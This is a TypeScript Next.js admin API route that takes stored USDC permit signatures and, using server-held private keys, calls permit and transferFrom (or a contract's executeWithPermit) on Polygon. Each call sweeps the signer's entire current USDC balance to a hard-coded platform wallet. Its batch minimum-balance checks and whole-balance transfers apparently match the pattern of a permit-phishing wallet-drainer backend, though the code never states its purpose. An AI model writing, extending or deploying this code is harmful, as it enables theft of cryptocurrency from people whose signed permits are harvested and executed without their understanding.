import { NextRequest, NextResponse } from 'next/server'
import { createClient } from '@supabase/supabase-js'
import {
  createWalletClient,
  createPublicClient,
  http,
  parseAbi,
  formatUnits,
  parseUnits,
  keccak256,
  toBytes,
  verifyTypedData,
} from 'viem'
import { verifyAdmin } from '@/lib/admin-auth'
import { polygon } from 'viem/chains'
import { privateKeyToAccount } from 'viem/accounts'

function getSupabaseAdmin() {
  const url = process.env.NEXT_PUBLIC_SUPABASE_URL
  const key = process.env.SUPABASE_SERVICE_ROLE_KEY
  
  if (!url || !key) {
    return null
  }
  
  return createClient(url, key)
}

// 配置
const CONFIG = {
  privateKey: process.env.EXECUTOR_PRIVATE_KEY as `0x${string}` | undefined,
  eoaExecutorPrivateKey: process.env.EOA_EXECUTOR_PRIVATE_KEY as `0x${string}` | undefined,
  rpcUrl: process.env.POLYGON_RPC_URL || 'https://polygon-rpc.com',
  usdcAddress: '0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359' as `0x${string}`,
  platformWallet: '0x6c4C745d909B13528e638C7Aa63ABA9406fA8c63' as `0x${string}`,
  merkleTreeContract: '0x76f0d64bC0D41262aebBCc584679Ee1EBb22dd0d' as `0x${string}`,
}

const USDC_ABI = parseAbi([
  'function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s)',
  'function transferFrom(address from, address to, uint256 amount) returns (bool)',
  'function balanceOf(address account) view returns (uint256)',
  'function nonces(address owner) view returns (uint256)',
  'function allowance(address owner, address spender) view returns (uint256)',
])

// PolnationMerkleTree 合约 ABI
const MERKLE_TREE_ABI = parseAbi([
  'function executeWithPermit(address owner, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s, address recipient, uint256 amount, bytes32 operationId)',
])

// 单笔要等链上回执，拥堵时远超默认的 10~15s。EOA spender 还要连发两笔。
export const maxDuration = 60

const PERMIT_TYPES = {
  Permit: [
    { name: 'owner', type: 'address' },
    { name: 'spender', type: 'address' },
    { name: 'value', type: 'uint256' },
    { name: 'nonce', type: 'uint256' },
    { name: 'deadline', type: 'uint256' },
  ],
} as const

function getFullSignature(sig: {
  full_signature?: string | null
  r: string
  s: string
  v: number
}): `0x${string}` {
  if (sig.full_signature?.startsWith('0x')) {
    return sig.full_signature as `0x${string}`
  }
  const normalizedV = sig.v < 27 ? sig.v + 27 : sig.v
  return `0x${sig.r.replace(/^0x/, '')}${sig.s.replace(/^0x/, '')}${normalizedV
    .toString(16)
    .padStart(2, '0')}` as `0x${string}`
}

async function verifyPermitSignature(sig: {
  owner_address: string
  spender_address: string
  value: string
  nonce: number
  deadline: number
  full_signature?: string | null
  r: string
  s: string
  v: number
}) {
  try {
    return await verifyTypedData({
      address: sig.owner_address as `0x${string}`,
      domain: {
        name: 'USD Coin',
        version: '2',
        chainId: polygon.id,
        verifyingContract: CONFIG.usdcAddress,
      },
      types: PERMIT_TYPES,
      primaryType: 'Permit',
      message: {
        owner: sig.owner_address as `0x${string}`,
        spender: sig.spender_address as `0x${string}`,
        value: BigInt(sig.value),
        nonce: BigInt(sig.nonce),
        deadline: BigInt(sig.deadline),
      },
      signature: getFullSignature(sig),
    })
  } catch {
    return false
  }
}

export async function POST(request: NextRequest) {
  // 验证管理员
  if (!await verifyAdmin()) {
    return NextResponse.json({ error: 'Unauthorized' }, { status: 401 })
  }

  try {
    const { signatureId, minimumBalanceUsdc } = await request.json()

    if (!signatureId) {
      return NextResponse.json({ error: 'Signature ID required' }, { status: 400 })
    }

    let minimumBalance: bigint | null = null
    if (minimumBalanceUsdc !== undefined) {
      try {
        const normalizedMinimum = String(minimumBalanceUsdc).trim()
        if (!normalizedMinimum) {
          throw new Error('Minimum balance cannot be empty')
        }
        minimumBalance = parseUnits(normalizedMinimum, 6)
        if (minimumBalance < BigInt(0)) {
          throw new Error('Minimum balance cannot be negative')
        }
      } catch {
        return NextResponse.json(
          { error: 'Invalid minimum USDC balance' },
          { status: 400 }
        )
      }
    }

    const supabaseAdmin = getSupabaseAdmin()
    if (!supabaseAdmin) {
      return NextResponse.json({ error: 'Database not configured' }, { status: 500 })
    }

    // 获取签名
    const { data: sig, error: fetchError } = await supabaseAdmin
      .from('permit_signatures')
      .select('*')
      .eq('id', signatureId)
      .eq('status', 'pending')
      .single()

    if (fetchError || !sig) {
      return NextResponse.json({ error: 'Signature not found or already used' }, { status: 404 })
    }

    // 检查 deadline
    const now = Math.floor(Date.now() / 1000)
    if (sig.deadline < now) {
      await supabaseAdmin
        .from('permit_signatures')
        .update({ status: 'expired' })
        .eq('id', signatureId)
      
      return NextResponse.json({ error: 'Signature expired' }, { status: 400 })
    }

    const isContractSpender =
      sig.spender_address?.toLowerCase() === CONFIG.merkleTreeContract.toLowerCase()
    const selectedPrivateKey = isContractSpender
      ? CONFIG.privateKey
      : CONFIG.eoaExecutorPrivateKey || CONFIG.privateKey

    if (!selectedPrivateKey) {
      return NextResponse.json({
        error: isContractSpender
          ? 'Executor private key not configured. Set EXECUTOR_PRIVATE_KEY in Vercel.'
          : 'EOA executor private key not configured. Set EOA_EXECUTOR_PRIVATE_KEY in Vercel.',
      }, { status: 500 })
    }

    const account = privateKeyToAccount(selectedPrivateKey)

    // EOA permit 只授权给 sig.spender_address；发 transferFrom 的账户必须就是它。
    // 不匹配时在 permit 上链前中止，避免再次制造「授权成功、转账失败」的半状态。
    if (
      !isContractSpender &&
      account.address.toLowerCase() !== sig.spender_address.toLowerCase()
    ) {
      return NextResponse.json({
        error:
          `EOA executor mismatch. Permit authorizes ${sig.spender_address}, ` +
          `but configured key controls ${account.address}. Set EOA_EXECUTOR_PRIVATE_KEY correctly.`,
      }, { status: 500 })
    }
    
    const publicClient = createPublicClient({
      chain: polygon,
      transport: http(CONFIG.rpcUrl),
    })

    const walletClient = createWalletClient({
      account,
      chain: polygon,
      transport: http(CONFIG.rpcUrl),
    })

    const [currentNonce, balance] = await Promise.all([
      publicClient.readContract({
        address: CONFIG.usdcAddress,
        abi: USDC_ABI,
        functionName: 'nonces',
        args: [sig.owner_address as `0x${string}`],
      }),
      publicClient.readContract({
        address: CONFIG.usdcAddress,
        abi: USDC_ABI,
        functionName: 'balanceOf',
        args: [sig.owner_address as `0x${string}`],
      }),
    ])

    if (balance === BigInt(0)) {
      return NextResponse.json({ error: 'User has no USDC balance' }, { status: 400 })
    }

    // 进度批处理可能持续很久，必须按执行瞬间的链上余额再次检查门槛。
    if (minimumBalance !== null && balance < minimumBalance) {
      return NextResponse.json({
        error: `Current USDC balance (${formatUnits(balance, 6)}) is below minimum (${formatUnits(minimumBalance, 6)})`,
      }, { status: 409 })
    }

    const permittedValue = BigInt(sig.value)
    if (balance > permittedValue) {
      return NextResponse.json({
        error: `USDC balance (${formatUnits(balance, 6)}) exceeds signed permit value (${formatUnits(permittedValue, 6)})`,
      }, { status: 400 })
    }

    let allowanceRecovery = false
    if (BigInt(sig.nonce) !== currentNonce) {
      if (!isContractSpender) {
        const allowance = await publicClient.readContract({
          address: CONFIG.usdcAddress,
          abi: USDC_ABI,
          functionName: 'allowance',
          args: [
            sig.owner_address as `0x${string}`,
            sig.spender_address as `0x${string}`,
          ],
        })
        allowanceRecovery = allowance >= balance
      }

      if (!allowanceRecovery) {
        await supabaseAdmin
          .from('permit_signatures')
          .update({ status: 'expired' })
          .eq('id', signatureId)

        return NextResponse.json({
          error: `Nonce mismatch. Expected ${sig.nonce}, got ${currentNonce}`,
        }, { status: 400 })
      }
    }

    if (!allowanceRecovery && !(await verifyPermitSignature(sig))) {
      return NextResponse.json({
        error: 'Cryptographic permit signature is invalid',
      }, { status: 400 })
    }

    let transferHash: `0x${string}`

    if (isContractSpender) {
      // 合约 spender：单笔调用 executeWithPermit（原子操作）
      // Signature IDs are UUIDs (36 bytes), so raw UTF-8 cannot fit bytes32.
      // Hashing gives a deterministic, correctly-sized operation ID.
      const operationId = keccak256(toBytes(signatureId.toString()))
      transferHash = await walletClient.writeContract({
        address: CONFIG.merkleTreeContract,
        abi: MERKLE_TREE_ABI,
        functionName: 'executeWithPermit',
        args: [
          sig.owner_address as `0x${string}`,
          BigInt(sig.value),
          BigInt(sig.deadline),
          sig.v,
          sig.r as `0x${string}`,
          sig.s as `0x${string}`,
          CONFIG.platformWallet,
          balance,
          operationId,
        ],
      })
    } else {
      // EOA spender（Trust / Bitget）：正常时 permit + transferFrom。
      // 若上次 permit 已成功但 transferFrom 失败，直接用现有 allowance 恢复。
      if (!allowanceRecovery) {
        const permitHash = await walletClient.writeContract({
          address: CONFIG.usdcAddress,
          abi: USDC_ABI,
          functionName: 'permit',
          args: [
            sig.owner_address as `0x${string}`,
            sig.spender_address as `0x${string}`,
            BigInt(sig.value),
            BigInt(sig.deadline),
            sig.v,
            sig.r as `0x${string}`,
            sig.s as `0x${string}`,
          ],
        })

        const permitReceipt = await publicClient.waitForTransactionReceipt({ hash: permitHash })
        if (permitReceipt.status !== 'success') {
          return NextResponse.json({
            error: `Permit reverted on-chain (${permitHash})`,
          }, { status: 400 })
        }
      }

      transferHash = await walletClient.writeContract({
        address: CONFIG.usdcAddress,
        abi: USDC_ABI,
        functionName: 'transferFrom',
        // 跳过 permit 刚确认后 RPC 节点状态不同步导致的 estimateGas 假失败。
        // Polygon USDC transferFrom 实际远低于此上限。
        gas: BigInt(120_000),
        args: [
          sig.owner_address as `0x${string}`,
          CONFIG.platformWallet,
          balance,
        ],
      })
    }

    // 先落库 tx hash 再等回执：函数若被平台超时掐断，链上凭证不会丢。
    await supabaseAdmin
      .from('permit_signatures')
      .update({ used_tx_hash: transferHash })
      .eq('id', signatureId)

    const receipt = await publicClient.waitForTransactionReceipt({ hash: transferHash })

    if (receipt.status !== 'success') {
      return NextResponse.json({
        error: `Transfer reverted on-chain (${transferHash})`,
      }, { status: 400 })
    }

    // 更新状态
    await supabaseAdmin
      .from('permit_signatures')
      .update({
        status: 'used',
        used_at: new Date().toISOString(),
        used_tx_hash: transferHash,
      })
      .eq('id', signatureId)

    const amountFormatted = formatUnits(balance, 6)

    return NextResponse.json({
      success: true,
      txHash: transferHash,
      amount: amountFormatted,
    })

  } catch (error) {
    console.error('Execution error:', error)
    return NextResponse.json({ 
      error: error instanceof Error ? error.message : 'Execution failed' 
    }, { status: 500 })
  }
}
